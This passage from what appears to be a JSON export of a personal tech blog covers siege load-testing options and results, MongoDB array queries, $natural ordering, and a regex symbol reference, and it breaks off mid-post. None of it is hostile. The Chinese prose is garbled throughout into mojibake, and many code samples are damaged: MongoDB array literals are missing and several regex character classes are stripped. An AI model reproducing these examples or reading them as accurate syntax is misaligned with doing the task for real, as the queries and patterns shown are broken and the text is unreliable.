éšæœºè®¿é—®urls.txtä¸­çš„urlåˆ—è¡¨é¡¹,ä»¥æ­¤æ¨¡æ‹ŸçœŸå®çš„è®¿é—®æƒ…å†µ(éšæœºæ€§),å½“urls.txtå­˜åœ¨æ˜¯æœ‰æ•ˆ -d n,â€“delay=n hitæ¯ä¸ªurlä¹‹é—´çš„å»¶è¿Ÿ,åœ¨0-nä¹‹é—´ -r n,â€“reps=n é‡å¤è¿è¡Œæµ‹è¯•næ¬¡,ä¸èƒ½ä¸ -tåŒæ—¶å­˜åœ¨ -t n,â€“time=n æŒç»­è¿è¡Œsiege â€˜nâ€™ç§’(å¦‚10S),åˆ†é’Ÿ(10M),å°æ—¶(10H) -l è¿è¡Œç»“æŸ,å°†ç»Ÿè®¡æ•°æ®ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ä¸­siege .log,ä¸€èˆ¬ä½äº/usr/local/var/siege .logä¸­,ä¹Ÿå¯åœ¨.siegercä¸­è‡ªå®šä¹‰ -R SIEGERC,â€“rc=SIEGERC æŒ‡å®šç”¨ç‰¹å®šçš„siege é…ç½®æ–‡ä»¶æ¥è¿è¡Œ,é»˜è®¤çš„ä¸ºHOME/.siegerc-f FILE, â€“file=FILE æŒ‡å®šç”¨ç‰¹å®šçš„urlsæ–‡ä»¶è¿è¡Œsiege ,é»˜è®¤ä¸ºurls.txt,ä½äºsiege å®‰è£…ç›®å½•ä¸‹çš„etc/urls.txt-u URL,â€“url=URL æµ‹è¯•æŒ‡å®šçš„ä¸€ä¸ªURL,å¯¹å®ƒè¿›è¡Œâ€siege â€œ,æ­¤é€‰é¡¹ä¼šå¿½ç•¥æœ‰å…³urlsæ–‡ä»¶çš„è®¾å®šæŠ¥é”™ï¼šWARNING: The number of users is capped at 255. To increase thislimit, search your .siegerc file for â€˜limitâ€™ and changeits value. Make sure you read the instructions thereâ€¦ç»“æœè¯´æ˜:Lifting the server siegeâ€¦ done.Transactions: 3419263 hits //å®Œæˆ419263æ¬¡å¤„ç†Availability: 100.00 % //100.00 % æˆåŠŸç‡Elapsed time: 5999.69 secs //æ€»å…±ç”¨æ—¶Data transferred: 84273.91 MB //å…±æ•°æ®ä¼ è¾“84273.91 MBResponse time: 0.37 secs //ç›¸åº”ç”¨æ—¶1.65ç§’ï¼šæ˜¾ç¤ºç½‘ç»œè¿æ¥çš„é€Ÿåº¦Transaction rate: 569.91 trans/sec //å‡æ¯ç§’å®Œæˆ 569.91 æ¬¡å¤„ç†ï¼šè¡¨ç¤ºæœåŠ¡å™¨åThroughput: 14.05 MB/sec //å¹³å‡æ¯ç§’ä¼ é€æ•°æ®Concurrency: 213.42 //å®é™…æœ€é«˜å¹¶å‘æ•°Successful transactions: 2564081 //æˆåŠŸå¤„ç†æ¬¡æ•°Failed transactions: 11 //å¤±è´¥å¤„ç†æ¬¡æ•°Longest transaction: 29.04 //æ¯æ¬¡ä¼ è¾“æ‰€èŠ±æœ€é•¿æ—¶é—´Shortest transaction: 0.00 //æ¯æ¬¡ä¼ è¾“æ‰€èŠ±æœ€çŸ­æ—¶é—´","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å‹åŠ›æµ‹è¯•","slug":"å‹åŠ›æµ‹è¯•","permalink":"https://wangxiuwen.github.io/tags/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"}],"author":"wangxiuwen"},{"title":"MongoDBçš„æŸ¥è¯¢æ•°ç»„","slug":"history/tech/5953c4d0c2b92f5665eed9f3","date":"2016-01-13T03:39:34.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f3/","excerpt":"","text":"MongoDBæŸ¥è¯¢æ•°ç»„å­¦ä¹ ç¬”è®°é¦–å…ˆæˆ‘ä»¬å…ˆæ’å…¥å‡ ä¸ªæ–‡æ¡£db.food.insert({â€œ_idâ€:1, â€œfruitâ€:})db.food.insert({â€œ_idâ€:2, â€œfruitâ€:})db.food.insert({â€œ_idâ€:3, â€œfruitâ€:})æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢æ—¢åŒ…å«â€appleâ€å¹¶ä¸”åˆåŒ…å«â€bananaâ€çš„æ–‡æ¡£ï¼Œå°±éœ€è¦ä½¿ç”¨â€$allâ€œæ¥æŸ¥è¯¢db.food.find({â€œfruitâ€:{â€œ$allâ€:}}){ â€œ_idâ€ : 1, â€œfruitâ€ : }{ â€œ_idâ€ : 3, â€œfruitâ€ : }è¿˜è®°å¾—ä¹‹å‰çš„â€inâ€œå—ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥è¯¢åŒ…å«â€appleâ€æˆ–è€…â€bananaâ€çš„æ–‡æ¡£ï¼Œåˆ™ä½¿ç”¨â€inâ€db.food.find({â€œfruitâ€:{â€œ$inâ€:}}){ â€œ_idâ€ : 1, â€œfruitâ€ : }{ â€œ_idâ€ : 2, â€œfruitâ€ : }{ â€œ_idâ€ : 3, â€œfruitâ€ : }ä½¿ç”¨â€$sizeâ€œå¯ä»¥æŸ¥è¯¢æŒ‡å®šé•¿åº¦çš„æ•°ç»„db.food.find({â€œfruitâ€:{$size:3}}){ â€œ_idâ€ : 1, â€œfruitâ€ : }{ â€œ_idâ€ : 2, â€œfruitâ€ : }{ â€œ_idâ€ : 3, â€œfruitâ€ : }ä½¿ç”¨â€$sliceâ€œè¿”å›æ•°ç»„ä¸­çš„ä¸€ä¸ªå­é›†åˆdb.blog.findOne(){â€_idâ€ : ObjectId(â€œ4e914ad2717ed94f8289ac08â€³),â€commentsâ€ : ,â€contentâ€ : â€œMy first blog.â€,â€titleâ€ : â€œHello Worldâ€}éœ€è¦è¿”å›commentsä¸­çš„å‰ä¸¤æ¡æ•°æ®ï¼Œå¦‚ä¸‹æŸ¥è¯¢è¯­å¥db.blog.findOne({},{â€œcommentsâ€:{$slice:2}}){â€_idâ€ : ObjectId(â€œ4e914ad2717ed94f8289ac08â€³),â€commentsâ€ : ,â€contentâ€ : â€œMy first blog.â€,â€titleâ€ : â€œHello Worldâ€}æŸ¥è¯¢commentsä¸­åä¸¤æ¡æ•°æ®çš„æŸ¥è¯¢è¯­å¥ï¼šdb.blog.findOne({},{â€œcommentsâ€:{$slice:-2}})è¿˜å¯ä»¥è¿”å›è·³è¿‡å‡ ä¸ªæ–‡æ¡£ä¹‹åçš„å‡ ä¸ªæ–‡æ¡£db.blog.findOne({},{â€œcommentsâ€:{$slice:}}){â€_idâ€ : ObjectId(â€œ4e914ad2717ed94f8289ac08â€³),â€commentsâ€ : ,â€contentâ€ : â€œMy first blog.â€,â€titleâ€ : â€œHello Worldâ€}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"$natural","slug":"history/tech/5953c4d0c2b92f5665eed9f4","date":"2016-01-12T21:08:40.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f4/","excerpt":"","text":"_idæ˜¯æŒ‰æ•°æ®æ’å…¥æ—¶é—´æ’åºï¼Œè€Œnaturalæ˜¯æŒ‰æ•°æ®åœ¨ç£ç›˜ä¸Šçš„ç»„ç»‡é¡ºåºæ’åºã€‚ å½“ä½ æ‰§è¡Œinsertæ“ä½œçš„æ—¶å€™ï¼Œé€šè¿‡Object.bsonsize(db.test.findOne());å‘½ä»¤æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¯æ¡è®°å½•çš„é•¿åº¦ä¸º31 å½“ä½ æŠŠaçš„å€¼updateæ—¶ï¼Œaçš„é•¿åº¦åœ¨é€æ­¥å¢åŠ ï¼Œåˆ†åˆ«ä¸º31ã€32ã€33.å› ä¸ºMongoDBåœ¨è®°å½•é•¿åº¦å˜åŒ–åï¼Œå‘ç°å½“å‰è®°å½•æ‰€åœ¨ç©ºé—´åé¢æ²¡æœ‰ç©ºä½™çš„ç©ºé—´å¯ä¾›å…¶å˜é•¿ã€‚é‚£ä¹ˆè¿™æ¡è®°å½•å°±ä¼šè¢«åˆ é™¤ç„¶åç§»åŠ¨åˆ°æ•°æ®é›†çš„æœ€åï¼Œæ‰€ä»¥å¯¼è‡´naturalæœ€åæ’åºçš„ç»“æœå’Œä¹‹å‰ä¸ä¸€æ ·ã€‚å› ä¸ºMongoDBæ¯ä¸€æ¡è®°å½•éƒ½ä¼šåš4å­—èŠ‚çš„å†…å­˜å¯¹é½ã€‚æ‰€ä»¥åœ¨ä½ åˆšæ’å…¥çš„æ—¶å€™ï¼Œè®°å½•é•¿åº¦è™½ç„¶åªæœ‰31å­—èŠ‚ï¼Œä½†æ˜¯MongoDBä¼šä¸ºå®ƒåˆ†é…32å­—èŠ‚ï¼ˆ8*4ï¼‰çš„ç©ºé—´ã€‚è¿™æ—¶å€™åœ¨å…¶æœ«å°¾å°±æœ‰ä¸€å­—èŠ‚çš„ç©ºé—²ï¼Œå½“ä½ å¢é•¿ä¸€å­—èŠ‚çš„æ—¶å€™ï¼Œè¿™ä¸€å­—èŠ‚çš„ç©ºé—²æ­£å¥½å¯ä»¥ç”¨ä¸Šã€‚æ‰€ä»¥å°±ä¸éœ€è¦ç§»åŠ¨ä½ç½®äº†ã€‚è€Œç¬¬äºŒæ¬¡ä»32å­—èŠ‚å˜æˆ33å­—èŠ‚ï¼ŒåŸæœ‰çš„ç©ºé—´å·²ç»ä¸èƒ½è£…ä¸‹äº†ï¼Œæ‰€ä»¥ä¼šé€ æˆæ•°æ®çš„ç§»åŠ¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"æ­£åˆ™è¡¨è¾¾å¼å…¨éƒ¨ç¬¦å·è§£é‡Š","slug":"history/tech/5953c4d0c2b92f5665eed9f2","date":"2016-01-10T20:14:44.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f2/","excerpt":"","text":"http://www.cnblogs.com/yirlin/archive/2006/04/12/373222.htmlå­—ç¬¦æè¿°\\å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€˜nâ€™ åŒ¹é…å­—ç¬¦ â€œnâ€ã€‚â€™\\nâ€™ åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\\â€™ åŒ¹é… â€œâ€ è€Œ â€œ(â€ åˆ™åŒ¹é… â€œ(â€ã€‚^åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜\\nâ€™ æˆ– â€˜\\râ€™ ä¹‹åçš„ä½ç½®ã€‚åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ ä¹ŸåŒ¹é… â€˜\\nâ€™ æˆ– â€˜\\râ€™ ä¹‹å‰çš„ä½ç½®ã€‚åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚+åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€˜zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚?åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œdo(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ æˆ– â€œdoesâ€ ä¸­çš„&quot;do&quot; ã€‚? ç­‰ä»·äº {0,1}ã€‚{n}n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€˜o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚{n,}n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€˜o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€˜o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€˜o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚{n,m}m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œo{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€˜o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚?å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ (*, +, ?, {n}, {n,}, {n,m}) åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸² â€œooooâ€ï¼Œâ€˜o+?â€™ å°†åŒ¹é…å•ä¸ª â€œoâ€ï¼Œè€Œ â€˜o+â€™ å°†åŒ¹é…æ‰€æœ‰ â€˜oâ€™ã€‚.åŒ¹é…é™¤ â€œ\\nâ€ ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬ â€˜\\nâ€™ åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨è±¡ â€˜â€™ çš„æ¨¡å¼ã€‚(pattern)åŒ¹é… pattern å¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„ Matches é›†åˆå¾—åˆ°ï¼Œåœ¨VBScript ä¸­ä½¿ç”¨ SubMatches é›†åˆï¼Œåœ¨JScript ä¸­åˆ™ä½¿ç”¨ $0â€¦$9 å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ â€˜(â€™ æˆ– â€˜)â€™ã€‚(?:pattern)åŒ¹é… pattern ä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨ â€œæˆ–â€ å­—ç¬¦ (|) æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œ â€˜industr(?:y|ies) å°±æ˜¯ä¸€ä¸ªæ¯” â€˜industry|industriesâ€™ æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚(?=pattern)æ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é… pattern çš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€˜Windows (?=95|98|NT|2000)â€™ èƒ½åŒ¹é… â€œWindows 2000â€ ä¸­çš„ â€œWindowsâ€ ï¼Œä½†ä¸èƒ½åŒ¹é… â€œWindows 3.1â€ ä¸­çš„ â€œWindowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹ã€‚(?!pattern)è´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é… pattern çš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚â€™Windows (?!95|98|NT|2000)â€™ èƒ½åŒ¹é… â€œWindows 3.1â€ ä¸­çš„ â€œWindowsâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œWindows 2000â€ ä¸­çš„ â€œWindowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”Ÿåï¼Œåœ¨æœ€åä¸€æ¬¡åŒ¹é…ä¹‹åç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»åŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åå¼€å§‹x|yåŒ¹é… x æˆ– yã€‚ä¾‹å¦‚ï¼Œâ€˜z|foodâ€™ èƒ½åŒ¹é… â€œzâ€ æˆ– â€œfoodâ€ã€‚â€™(z|f)oodâ€™ åˆ™åŒ¹é… â€œzoodâ€ æˆ– â€œfoodâ€ã€‚å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„ â€˜aâ€™ã€‚è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„â€™pâ€™ã€‚å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™â€™ å¯ä»¥åŒ¹é… â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™â€™ å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨ â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚\\båŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œ â€˜er\\bâ€™ å¯ä»¥åŒ¹é…&quot;never&quot; ä¸­çš„ â€˜erâ€™ï¼Œä½†ä¸èƒ½åŒ¹é… â€œverbâ€ ä¸­çš„ â€˜erâ€™ã€‚\\BåŒ¹é…éå•è¯è¾¹ç•Œã€‚â€˜er\\Bâ€™ èƒ½åŒ¹é… â€œverbâ€ ä¸­çš„ â€˜erâ€™ï¼Œä½†ä¸èƒ½åŒ¹é… â€œneverâ€ ä¸­çš„ â€˜erâ€™ã€‚\\cxåŒ¹é…ç”± x æŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \\cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›è½¦ç¬¦ã€‚x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°† c è§†ä¸ºä¸€ä¸ªåŸä¹‰çš„ â€˜câ€™ å­—ç¬¦ã€‚\\dåŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº ã€‚\\DåŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº ã€‚\\fåŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº \\x0c å’Œ \\cLã€‚\\nåŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº \\x0a å’Œ \\cJã€‚\\råŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº \\x0d å’Œ \\cMã€‚\\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº ã€‚\\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº ã€‚\\tåŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \\x09 å’Œ \\cIã€‚\\våŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \\x0b å’Œ \\cKã€‚\\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äºâ€™â€™ã€‚\\WåŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äº â€˜â€™ã€‚\\xnåŒ¹é… nï¼Œå…¶ä¸­ n ä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œâ€™\\x41â€™ åŒ¹é… â€œAâ€ã€‚â€™\\x041â€™ åˆ™ç­‰ä»·äº â€˜\\x04â€™ &amp; â€œ1â€ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ ASCII ç¼–ç ã€‚.\\numåŒ¹é… numï¼Œå…¶ä¸­ num æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€™(.)\\1â€™ åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚\\næ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ \\n ä¹‹å‰è‡³å°‘ n ä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™ n ä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™ n ä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚\\nmæ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ \\nm ä¹‹å‰è‡³å°‘æœ‰ nm ä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™ nm ä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ \\nm ä¹‹å‰è‡³å°‘æœ‰ n ä¸ªè·å–ï¼Œåˆ™ n ä¸ºä¸€ä¸ªåè·Ÿæ–‡å­— m çš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥ n å’Œ m å‡ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™ \\nm å°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼ nmã€‚\\nmlå¦‚æœ n ä¸ºå…«è¿›åˆ¶æ•°å­— (0-3)ï¼Œä¸” m å’Œ l å‡ä¸ºå…«è¿›åˆ¶æ•°å­— (0-7)ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼ nmlã€‚\\unåŒ¹é… nï¼Œå…¶ä¸­ n æ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„ Unicode å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \\u00A9 åŒ¹é…ç‰ˆæƒç¬¦å· (?)ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://wangxiuwen.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"author":"wangxiuwen"},{"title":"è½¬ä¸ºå­—ç¬¦ä¸²","slug":"history/tech/5953c4d0c2b92f5665eed9f1","date":"2016-01-10T20:04:36.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f1/","excerpt":"","text":"var value = value + 